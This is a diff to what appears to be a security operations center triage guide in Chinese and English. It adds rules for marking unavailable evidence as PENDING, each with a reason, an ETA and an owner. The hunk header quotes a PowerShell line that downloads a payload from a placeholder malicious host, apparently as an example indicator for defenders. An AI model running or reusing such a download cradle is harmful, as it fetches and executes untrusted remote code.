@@ -269,6 +269,17 @@ $s.DownloadString('http://malicious.example/payload')
 - 啟動 IR playbook：suspected phishing → potential ransomware staging
 ````
 
+### Evidence Pending 標註規範
+
+某些 evidence 在 triage 當下暫時無法取得（enrichment API 斷線、告警缺 hash、TI 平台超時）——這**不等同跳過 enrichment**。L1 仍須在 ticket 的 Evidence 區塊標註，讓 L2 / auditor / 接班人能區分「已嘗試但受阻」與「根本沒查」：
+
+```
+- [VirusTotal Lookup]: **PENDING** — reason: 告警未含 file hash，需 EDR host search; ETA: 30 min; owner: L1 本人（或接班人）
+- [Sigma Rule Snapshot]: **PENDING** — reason: SIEM link 403（平台異常）; ETA: 待平台復原; owner: SOC Engineer（附 ops ticket）
+```
+
+每筆 pending 須填 reason / ETA / owner（平台問題已轉單則附 ticket ID）。留痕要求：補回後在原行附 `（補回 HH:MM）` 並移除 `PENDING`、不靜默替換；shift 結束仍 pending 寫進 handover 的 Active / Pending Tickets；平台異常導致的 pending 同步記入 Systemic Issues Observed（見 §Process / Systemic Escalation Paths）。
+
 ### Splunk SPL Query — Triage 用查詢（read & adjust filters，不是寫新規則）
 
 ```spl
